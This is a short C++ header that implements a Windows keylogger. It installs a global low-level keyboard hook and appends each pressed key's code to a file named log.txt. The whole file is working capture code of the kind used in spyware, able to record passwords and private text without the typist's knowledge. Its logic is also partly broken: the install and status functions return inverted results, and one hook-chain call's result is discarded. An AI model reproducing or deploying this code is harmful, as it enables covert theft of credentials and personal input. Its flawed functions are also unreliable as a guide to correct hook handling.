#ifndef KEYLOG_H
#define KEYLOG_H

#include <iostream>
#include <fstream>
#include <string>
#include <windows.h>

std::string keylog = ""; // this string holds the keys logged

HHOOK eHook = NULL;

LRESULT OurKeyboardProc(int nCode, WPARAM wparam, LPARAM lparam)
{
    if(nCode < 0)
        CallNextHookEx(eHook,nCode,wparam,lparam);

    KBDLLHOOKSTRUCT *kbs = (KBDLLHOOKSTRUCT *)lparam;

    if(wparam==WM_KEYDOWN||wparam==WM_SYSKEYDOWN)
    {
        keylog+=kbs->vkCode;
        // test section needs to be optimized * done for testing purpose
        std::ofstream outfile;
        outfile.open("log.txt",std::ios_base::app);
        outfile<<keylog<<std::endl;
        outfile.close();
        keylog="";
        // test section ends here
    }

    return CallNextHookEx(eHook,nCode,wparam,lparam);
}

bool InstallHook()
{
    eHook = SetWindowsHookEx(WH_KEYBOARD_LL,(HOOKPROC)OurKeyboardProc,GetModuleHandle(NULL),0);
    return eHook==NULL;
}

bool UninstallHook()
{
    BOOL b = UnhookWindowsHookEx(eHook);
    eHook = NULL;
    return (bool)b;
}

bool IsHooked()
{
    return (bool)(eHook==NULL);
}
#endif // KEYLOG_H
